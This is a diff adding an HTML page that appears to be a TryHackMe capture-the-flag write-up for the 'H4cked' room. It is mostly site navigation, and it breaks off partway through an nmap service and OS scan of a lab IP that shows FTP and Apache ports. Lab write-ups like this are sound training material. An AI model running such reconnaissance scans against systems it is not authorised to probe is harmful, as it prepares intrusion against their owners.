@@ -1,0 +1,1242 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../poster/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
+    
+    
+      
+        <title>H4cked - THM Writeups | Vasanth Vanan</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ffa9267a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#scanning" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="THM Writeups | Vasanth Vanan" class="md-header__button md-logo" aria-label="THM Writeups | Vasanth Vanan" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            THM Writeups | Vasanth Vanan
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              H4cked
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/VasanthVanan/tryhackme-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../colddbox/" class="md-tabs__link md-tabs__link--active">
+        Easy Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../medium/index.md" class="md-tabs__link">
+        Medium Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../hard/index.md" class="md-tabs__link">
+        Hard Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../insane/index.md" class="md-tabs__link">
+        Insane Challenges
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="THM Writeups | Vasanth Vanan" class="md-nav__button md-logo" aria-label="THM Writeups | Vasanth Vanan" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    THM Writeups | Vasanth Vanan
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/VasanthVanan/tryhackme-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          Easy Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Easy Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../colddbox/" class="md-nav__link">
+        ColddBox Easy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ARcHanG3l/" class="md-nav__link">
+        ARcHanG3l
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ToolsRUs/" class="md-nav__link">
+        ToolsRUs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE-2021-29447/" class="md-nav__link">
+        Wordpress CVE
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tech_Supp0rt/" class="md-nav__link">
+        Tech_Supp0rt-1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AllInOne/" class="md-nav__link">
+        All in One
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../plottedtms/" class="md-nav__link">
+        Plotted-TMS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../poster/" class="md-nav__link">
+        Poster
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          H4cked
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        H4cked
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    Task 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    Task 2
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          Medium Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Medium Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../medium/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          Hard Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Hard Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hard/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          Insane Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Insane Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../insane/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1" class="md-nav__link">
+    Task 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2" class="md-nav__link">
+    Task 2
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+  <h1>H4cked</h1>
+
+<p><a class="md-button" href="https://tryhackme.com/room/h4cked">TryHackMe Link</a></p>
+<div class="admonition example">
+<p class="admonition-title">Description</p>
+<p><p id="desc" style="font-size:15px"></p></p>
+</div>
+<h2 id="scanning"><b>Scanning</b><a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b></p>
+</li>
+<li>
+<p>Open Ports: </p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center"><p style="font-size:14px; color: black">PORT</p></th>
+<th align="center"><p style="font-size:14px; color: black">SERVICE</p></th>
+<th align="center"><p style="font-size:14px; color: black">DESCRIPTION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center"><p id="p1" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="s1" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d1" style="font-size:14px; color: purple"></p></td>
+</tr>
+<tr>
+<td align="center"><p id="p2" style="font-size:14px;  color: purple"></p></td>
+<td align="center"><p id="s2" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d2" style="font-size:14px; color: purple"></p></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Nmap Report:
+  <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Nmap 7.93 scan initiated Wed Mar  1 20:02:56 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.199.134</span>
+<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">199.134</span>
+<span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.15</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
+<span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">998</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+<span class="w">  </span><span class="n">PORT</span><span class="w">   </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
+<span class="hll"><span class="w">  </span><span class="m">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="m">2.0</span><span class="n">.</span><span class="m">8</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">later</span>
+</span><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Apache2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Page</span><span class="o">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">works</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="nf">host </span><span class="p">(</span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">it</span><span class="p">,</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">)</span><span class="n">.</span>
+</span><span class="w">  </span><span class="n">TCP</span><span class="o">/</span><span class="n">IP</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">:</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">3</span><span class="o">/</span><span class="m">1</span><span class="o">%OT=21%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=42710%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">63</span><span class="n">FFF5E2</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:%P=aarch64-unknown-linux-gnu)SEQ(SP=100%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=106%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%CI=Z%</span><span class="n">II</span><span class="o">=</span><span class="n">I</span><span class="o">%TS=</span>
+<span class="o">  OS:A)OPS(O1=M505ST11NW7%</span><span class="n">O2</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O3=M505NNT11NW7%</span><span class="n">O4</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O5=M5</span>
+<span class="o">  OS:05ST11NW7%</span><span class="n">O6</span><span class="o">=</span><span class="n">M505ST11</span><span class="p">)</span><span class="nf">WIN</span><span class="p">(</span><span class="n">W1</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W2=F4B3%</span><span class="n">W3</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W4=F4B3%</span><span class="n">W5</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W6=F4B</span>
+<span class="o">  OS:3)ECN(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="n">F507</span><span class="o">%O=M505NNSNW7%</span><span class="n">CC</span><span class="o">=</span><span class="n">Y</span><span class="o">%Q=)T1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">S</span><span class="o">=</span><span class="n">O</span><span class="o">%A=S</span>
+<span class="o">  OS:+%</span><span class="bp">F</span><span class="o">=</span><span class="n">AS</span><span class="o">%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T2</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T3</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T4</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=</span>
